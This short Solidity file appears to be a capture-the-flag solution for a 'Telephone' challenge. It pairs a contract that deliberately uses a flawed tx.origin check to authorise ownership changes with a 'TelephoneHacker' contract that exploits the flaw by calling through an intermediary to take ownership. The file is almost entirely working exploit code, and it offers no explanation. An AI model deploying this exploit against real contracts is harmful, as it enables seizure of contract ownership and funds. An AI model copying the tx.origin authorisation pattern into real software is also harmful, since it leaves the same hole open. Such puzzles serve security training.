// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneHacker {
    function changeOwner(address telephone) external {
        Telephone(telephone).changeOwner(msg.sender);
        require(Telephone(telephone).owner() == msg.sender, "Change Owner failed");
    }
}